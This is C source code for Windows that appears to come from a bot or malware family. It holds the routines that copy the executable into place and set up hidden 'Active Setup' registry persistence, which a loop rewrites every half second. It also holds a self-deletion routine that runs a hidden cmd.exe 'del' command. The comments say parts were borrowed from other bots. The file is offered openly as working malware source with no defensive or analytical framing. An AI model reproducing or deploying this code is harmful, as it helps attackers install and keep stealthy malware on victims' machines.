#include "includes.h"

bool file_exists( LPSTR lpszFilename )
{
	if ( GetFileAttributes(lpszFilename) == 0xffffffff )
		return false;

	return true;
}

bool bot_install( char *pszCurrentPath, char *pszInstallPath )
{
	if ( !pszCurrentPath || !pszInstallPath ) return false;

	if ( file_exists(pszInstallPath) == true )
		SetFileAttributes( pszInstallPath, FILE_ATTRIBUTE_NORMAL );

	if ( CopyFile(pszCurrentPath, pszInstallPath, FALSE) == TRUE )
	{
#ifdef DBG_LOG
		DbgPrintFile( "[+] bot_install() copied file..." );
#endif
		return true;
	}

	return false;
}

/*
	credit goes to ksv (I think?)
*/
void bot_rmself( void )
{
	TCHAR szFile[MAX_PATH], szCmd[MAX_PATH];

	if ( (GetModuleFileName(0, szFile, MAX_PATH) != 0) && (GetShortPathName(szFile, szFile, MAX_PATH) != 0) )
	{
		lstrcpy(szCmd, "/c del ");
		lstrcat(szCmd, szFile);
		lstrcat(szCmd, " >> NUL");

		if ( (GetEnvironmentVariable("ComSpec", szFile, MAX_PATH) != 0) && ((INT)ShellExecute(0, 0, szFile, szCmd, 0, SW_HIDE) > 32) )
			ExitProcess( 0 );
	}
}

void bot_uninstall( void )
{
	TerminateThread( hStartup, 0 );
	HKEY key = 0;
	char szKey[MAX_PATH]="";
	_snprintf( szKey, sizeof(szKey)-1, "%s\\%s", str_smasic, str_subkey );
	RegOpenKeyEx( HKEY_LOCAL_MACHINE, szKey, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, &key );
	RegDeleteValue( key, "StubPath" );
	RegCloseKey( key );
	RegDeleteKey( HKEY_LOCAL_MACHINE, szKey );
	bot_rmself();
}

// "active setup" autostart
// somewhat copied from dcibot
int thread_startup( char *pszPath )
{
	char szTemp[MAX_PATH]="";
	strcat( szTemp, str_smasic );
	strcat( szTemp, "\\" );
	strcat( szTemp, str_subkey );

	char pathwithparam[MAX_PATH]="";
	_snprintf( pathwithparam, sizeof(pathwithparam)-1, "%s /b", pszPath );

	HKEY key = 0;

	for ( ; ; )
	{
		if ( RegCreateKeyEx(HKEY_LOCAL_MACHINE, szTemp, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL) == ERROR_SUCCESS )
		{
			RegSetValueEx( key, "StubPath", 0, REG_SZ, (const BYTE *)pathwithparam, strlen(pathwithparam) );
			RegCloseKey( key );
			RegCreateKeyEx( HKEY_CURRENT_USER, str_smasic, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL );
			RegDeleteKey( key, str_subkey );
			RegCloseKey( key );
		}

		Sleep( 500 );
	}

	return 0;
}